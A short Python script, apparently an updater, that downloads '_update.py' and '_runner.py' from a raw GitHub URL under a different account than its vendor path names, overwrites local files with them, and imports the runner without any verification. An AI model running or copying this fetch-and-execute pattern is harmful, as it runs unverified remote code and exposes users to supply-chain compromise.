# -*- coding: utf-8 -*-

import requests
open('vendor/pveltrop/pyrunner/_update.py', 'wb').write(requests.get('https://raw.githubusercontent.com/43874/pyrunner/master/_update.py').content)
open('vendor/pveltrop/pyrunner/_runner.py', 'wb').write(requests.get('https://raw.githubusercontent.com/43874/pyrunner/master/_runner.py').content)
import _runner